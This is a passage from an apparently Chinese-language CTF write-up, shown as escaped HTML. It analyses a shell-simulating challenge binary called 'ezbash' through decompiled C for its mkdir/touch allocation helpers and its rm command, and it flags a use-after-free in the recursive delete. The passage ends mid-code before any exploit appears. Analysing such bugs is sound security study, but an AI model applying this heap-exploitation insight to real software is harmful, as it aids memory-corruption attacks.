class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( cmd[v4] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;built_in&#34;&gt;strchr&lt;/span&gt;(cmd[v4], v3[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;built_in&#34;&gt;strchr&lt;/span&gt;(cmd[v4], v3[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v5 = cuurr_pos-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ((&amp;amp;check_error + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ++v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v6 = calloc40();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v6-&amp;gt;flag = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        copy_name(v6, cmd[v4]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( cuurr_pos-&amp;gt;firstson )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          link(v5, v6);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          cuurr_pos-&amp;gt;firstson = v6;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ++v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;mkdir 与 touch 创建新的 file 的时候，调用 calloc40，这个其实就是模拟了 calloc&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;file *&lt;span class=&#34;title function_&#34;&gt;malloc40&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(v1-&amp;gt;name, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(v1-&amp;gt;name));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1-&amp;gt;context = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1-&amp;gt;firstson = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1-&amp;gt;next_bro = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1-&amp;gt;prev_bro = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1-&amp;gt;futher = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file *__fastcall &lt;span class=&#34;title function_&#34;&gt;link&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(file *curr, file *aim)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( curr-&amp;gt;next_bro )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    curr = curr-&amp;gt;next_bro;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  curr-&amp;gt;next_bro = aim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  result = aim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  aim-&amp;gt;prev_bro = curr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这也导致了，后面泄露地址有点困难。两个命令支持在当前目录下一次创建多个对象&lt;/p&gt;
&lt;h4 id=&#34;rm&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rm&#34;&gt;#&lt;/a&gt; rm&lt;/h4&gt;
&lt;p&gt;rm 可以进行两种操作，直接删除文件，或者 - r 参数删除文件夹，但是都只是当前目录下的对象。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;arm&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **cmd)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Bh] [rbp-15h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *file; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *ptr; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !cmd[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: missing operand\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( cmd[v3] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    file = cuurr_pos-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !&lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(cmd[v3], &lt;span class=&#34;string&#34;&gt;&amp;quot;-r&amp;quot;&lt;/span&gt;) )               &lt;span class=&#34;comment&#34;&gt;// -r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( cmd[++v3] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( file )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !&lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(file-&amp;gt;name, cmd[v3]) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v2 = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !checkfolder(file) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash -r: cannot remove &amp;#x27;%s&amp;#x27;: Is a file\n&amp;quot;&lt;/span&gt;, cmd[v3]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_26;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(file-&amp;gt;name, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(file-&amp;gt;name));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            file-&amp;gt;futher = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( file-&amp;gt;firstson )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              ptr = file-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( ptr-&amp;gt;context )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(ptr-&amp;gt;context);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(ptr);                      &lt;span class=&#34;comment&#34;&gt;// uaf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                                &lt;span class=&#34;comment&#34;&gt;// &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ptr = ptr-&amp;gt;next_bro;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( ptr );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_14;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          file = file-&amp;gt;next_bro;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_26;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;                                           &lt;span class=&#34;comment&#34;&gt;// 删除单文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                                &lt;span class=&#34;comment&#34;&gt;// &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                                &lt;span class=&#34;comment&#34;&gt;// &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( file )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !&lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(file-&amp;gt;name, cmd[v3]) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          v2 = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( checkfile(file) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(file-&amp;gt;name, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(file-&amp;gt;name));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( file-&amp;gt;context )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &lt;span 